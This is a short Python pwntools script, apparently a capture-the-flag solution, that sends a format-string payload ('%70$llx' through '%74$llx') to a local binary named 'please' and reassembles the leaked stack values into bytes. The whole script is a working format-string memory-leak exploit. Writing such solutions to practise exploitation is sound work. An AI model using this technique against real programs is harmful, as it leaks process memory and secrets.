from pwn import *

elf = ELF("./please")
io = process(elf.path)

payload = "please "
for i in range(5):
    payload += "%" + str(70+i) + "$llx "

io.sendlineafter("?", payload)

io.recvuntil(" ")

l = b""
for i in range (5):
    l += p64(int(io.recvuntil(" "), 16))

print(l)
